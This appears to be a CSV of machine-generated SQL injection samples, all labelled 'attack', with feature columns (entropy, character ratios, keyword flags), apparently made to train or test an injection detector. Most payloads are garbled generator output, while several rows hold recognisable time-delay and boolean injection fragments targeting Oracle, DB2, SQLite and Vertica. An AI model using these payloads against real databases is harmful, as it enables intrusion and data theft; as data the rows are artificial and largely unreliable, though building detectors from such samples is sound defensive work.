label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ''   ||char  83c'  =  ' a,ugub$cmas es fh"" like ""esys as tu.s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119,401.0,45.0,3.8913612289314625,138.0,37.0,163.0,63.0,0.34413965087281795,0.09226932668329177,0.40648379052369077,0.1571072319201995,5.0,2.0,0.0,0.0,0.0,2.0,0.0,32.0,1.0,2.0,5.0,14.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,0.0,11.0
attack,193541' l_ t3  =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120,20.0,12.0,3.246439344671016,2.0,7.0,6.0,5.0,0.1,0.35,0.3,0.25,1.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1 1570k   abm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121,13.0,9.0,2.931208948910323,4.0,5.0,4.0,0.0,0.3076923076923077,0.38461538461538464,0.3076923076923077,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,10x7171706a71,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122,13.0,6.0,2.3158243335257076,2.0,11.0,0.0,0.0,0.15384615384615385,0.8461538461538461,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'  =  's ayn'  )   and    (    (   'efiv' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'habl_ufobndu$rusy at_tap_ulmaastb$suget_s t1laagt  (  3862adom.tands do where likeioll_t_(    (  (  =  elsee2180  (  (  (  2961  ,  3484100couns ains  as arl_t1,s,ins as t4s iu aouf,as ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123,465.0,43.0,4.208511278384723,186.0,51.0,157.0,71.0,0.4,0.10967741935483871,0.33763440860215055,0.15268817204301074,6.0,0.0,0.0,0.0,0.0,3.0,0.0,32.0,0.0,9.0,8.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,11.0
attack,"1arttaed,as or at  2027p,b$b$f abnsms 3 where or ta,and t  (  (  (  (, likeet  =p  (    (  (  (  (  ,0x78  (  ous aUppdouastasysumfun t1eaftegecds where from char  (  105  (  ryl_usu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124,182.0,36.0,4.200111797881877,96.0,13.0,52.0,21.0,0.5274725274725275,0.07142857142857142,0.2857142857142857,0.11538461538461539,0.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,1.0,5.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,7.0
attack,"11760   from 9575(  *    (  (  ( a5000000000      )    (  (    = and (  )_un)p_s  r f5  *  =)    (  (    (  1441    (  select t  (    =  (  (  113  122es likep_unanghrblindpel_ut;t1,siblll_ubm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125,192.0,36.0,3.8225954602519527,55.0,31.0,76.0,30.0,0.2864583333333333,0.16145833333333334,0.3958333333333333,0.15625,0.0,0.0,0.0,0.0,2.0,3.0,1.0,18.0,0.0,5.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1yht1%v1z%%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126,158.0,34.0,4.110563564495676,80.0,10.0,45.0,23.0,0.5063291139240507,0.06329113924050633,0.2848101265822785,0.14556962025316456,2.0,2.0,0.0,0.0,1.0,2.0,0.0,6.0,5.0,0.0,2.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""jL(  (  (  3880exp_s t,$,* .s 3580 where ast  (  (  rys ass untdssusub$ftaaumgep_ung' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'uns,apes ,s t2,sy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127,598.0,47.0,4.084468375833718,230.0,61.0,217.0,90.0,0.38461538461538464,0.1020066889632107,0.362876254180602,0.1505016722408027,2.0,2.0,0.0,0.0,2.0,3.0,0.0,44.0,0.0,9.0,13.0,17.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,15.0
attack,1'   )    =    (  (  l  +char  111  ('fromi/*dolulmcprysusym.cblll_us imds t2s x asyststas and acrty  m.tallllluhwhere t2gmas t1s where and t4unp  1441  5485    ) a    (  (    mcongepgegerept_inldomdomas agup  r_un,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128,214.0,36.0,4.338458249123218,124.0,16.0,56.0,18.0,0.5794392523364486,0.07476635514018691,0.2616822429906542,0.08411214953271028,2.0,0.0,0.0,1.0,1.0,1.0,0.0,7.0,0.0,3.0,0.0,4.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,4.0
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""s where t  (  select   +char  =    (    (  if    char  (  +  (  =     (  u   (  (  )  1048)   m.s tri.fgins and cgunf t_mntdes as adni    g' and    (  b  (  )    (  (  122  =      =  =    (  (  ( where (  (  (  *  l_usuint g',ab$igf,  =   from as and 7522(  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129,621.0,41.0,3.4895354139652337,182.0,58.0,289.0,92.0,0.29307568438003223,0.09339774557165861,0.46537842190016104,0.14814814814814814,2.0,2.0,0.0,0.0,1.0,8.0,0.0,59.0,0.0,2.0,3.0,21.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,2.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,14.0,0.0,0.0,0.0,26.0
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'||  (  select ' ao),iloas amabgtctas tadesusudt where a       3455from 5485  caseyt_(    =_s and ort1,et_t char     +char  2724  )    where 9643  (  =  ll_hal",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131,160.0,37.0,4.230404145200913,77.0,18.0,47.0,18.0,0.48125,0.1125,0.29375,0.1125,2.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,0.0,4.0,2.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,6.0
attack,"1   6503sriumta,7555s t1ys domdpssys  = t3  (    (  83  (  1441  (  (  118  (  (   convert  (  =  (  (  char  1441  (  (  ( fex   or f,p_in.latzwd.ct  re$fupp_ins dol_ustaomt_iba(      ,,ul$(  tchar  8403  500000000  (  )   ,null from   from ty   )    (  118  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132,260.0,38.0,4.048465578452726,92.0,40.0,94.0,34.0,0.35384615384615387,0.15384615384615385,0.36153846153846153,0.13076923076923078,0.0,0.0,0.0,0.0,0.0,2.0,0.0,19.0,0.0,4.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,5.0
attack,"1%cus'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'nmdpdom",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133,205.0,35.0,3.823188206123443,66.0,27.0,80.0,32.0,0.32195121951219513,0.13170731707317074,0.3902439024390244,0.15609756097560976,2.0,0.0,0.0,0.0,0.0,1.0,0.0,18.0,1.0,1.0,3.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )      )     where and 1     ora,ain.gupgt1  )    (  7793    (  (  ( or 6503 char  =  (    5485   uplrt3(  (    comol_unas ug' d"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""omnp_s a,inth1um.tasdoblsys"" as t2,_us t4='  =  'au(    (  (  (  (  ,null  (  (  (  500000000  =    (  ((  121  =  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135,379.0,41.0,3.9815539847835475,116.0,46.0,151.0,66.0,0.30606860158311344,0.12137203166226913,0.39841688654353563,0.1741424802110818,3.0,4.0,2.0,0.0,0.0,6.0,0.0,32.0,0.0,5.0,5.0,14.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,6.0
attack,"11640%""   )   ||when     ""yobb"" a' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'  (  +char  (  (    =    (  lles   rw  luta,ubsednng,dounte,al1pefing4expoleulesusedomntyeg   ,domain.ds where or    s   dblrdct3(  (  = char  8403  (  3484  (   (  =    (  (  (  (  )p_ where 9575  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136,381.0,45.0,4.191397268274881,140.0,43.0,139.0,59.0,0.3674540682414698,0.11286089238845144,0.3648293963254593,0.15485564304461943,2.0,3.0,2.0,0.0,0.0,5.0,0.0,26.0,1.0,3.0,5.0,17.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,7.0
attack,"1"" where (  (  (  )  (  = or l_,donin.sus tasys t or as antdsyses asimattininbl_im.st1v airiusubttabftlefgeg',null  (  ,500000000  (  (    (  =  (econcat  (  (  (  (  (  =  (  (  , 2774 and (  (  ,500000000pdoulll_inin.p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137,220.0,36.0,4.158050497911213,99.0,24.0,62.0,35.0,0.45,0.10909090909090909,0.2818181818181818,0.1590909090909091,1.0,1.0,0.0,0.0,0.0,3.0,0.0,19.0,0.0,3.0,5.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'+  (  select 'dnn.p'  )   and 8148  =  like  (  'll_usus t2b$ft_y,ass as as t2ly orbecfmdoumaatab$fs asysi$ti$om.maiomonmnomiluns and and    char  (  (  (ephexp  (  abl_upel_ulme,at5 t5  (  =   t  (  2774 rb  =  6503      (  ||and o)    (  (   =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138,247.0,40.0,4.290225688954254,118.0,17.0,76.0,36.0,0.4777327935222672,0.06882591093117409,0.3076923076923077,0.145748987854251,4.0,0.0,0.0,0.0,0.0,4.0,0.0,13.0,0.0,4.0,2.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,6.0
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139,178.0,28.0,3.513746854441119,111.0,12.0,41.0,14.0,0.6235955056179775,0.06741573033707865,0.2303370786516854,0.07865168539325842,2.0,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'   when ors 6388  (  (  (  (  char    char  )    =    (  select  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140,69.0,21.0,3.1361447984894784,21.0,5.0,33.0,10.0,0.30434782608695654,0.07246376811594203,0.4782608695652174,0.14492753623188406,1.0,0.0,2.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,3.0
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'   omtas  aining,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142,18.0,11.0,3.1916116417513782,11.0,1.0,5.0,1.0,0.6111111111111112,0.05555555555555555,0.2777777777777778,0.05555555555555555,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'  )    =    (    (  (  b  (  (    4018    (,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143,122.0,30.0,3.6985968306966313,41.0,14.0,49.0,18.0,0.3360655737704918,0.11475409836065574,0.4016393442622951,0.14754098360655737,2.0,0.0,1.0,0.0,0.0,1.0,0.0,9.0,0.0,0.0,0.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-0co.tlinm= and or or 3880  ,  4799 from 1668    (  +  (u22724 3122  (  =  +char  (  83  (  )  =    (  f char  (  (  select us a char  1441  (  (  ) or 8571(   )(e500000000",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144,172.0,33.0,3.8909305496350486,44.0,41.0,64.0,23.0,0.2558139534883721,0.23837209302325582,0.37209302325581395,0.13372093023255813,0.0,0.0,1.0,0.0,0.0,3.0,0.0,15.0,0.0,0.0,1.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,9.0
attack,"1   /*  )   fromyuns tl2,dom as ,bsys as char  ,0  )    3862 where  )    = 6849  (     =  ,Aml_inw .sundmm.tabyst_= t,llhssuntl' and   (  =   6849 i.p_mdbmal',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'm,siblilaunt  (  (  ||  (  +char(  (  =  ( or tappjugexpcys te",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145,295.0,44.0,4.241604245682614,122.0,25.0,103.0,45.0,0.4135593220338983,0.0847457627118644,0.34915254237288135,0.15254237288135594,3.0,0.0,0.0,2.0,1.0,5.0,0.0,18.0,0.0,3.0,7.0,11.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,6.0
attack,1'   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146,7.0,4.0,1.8423709931771084,0.0,1.0,3.0,3.0,0.0,0.14285714285714285,0.42857142857142855,0.42857142857142855,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'h1174906||xhl_ t1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147,197.0,34.0,3.90796268749643,60.0,32.0,73.0,32.0,0.30456852791878175,0.16243654822335024,0.37055837563451777,0.16243654822335024,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,2.0,3.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
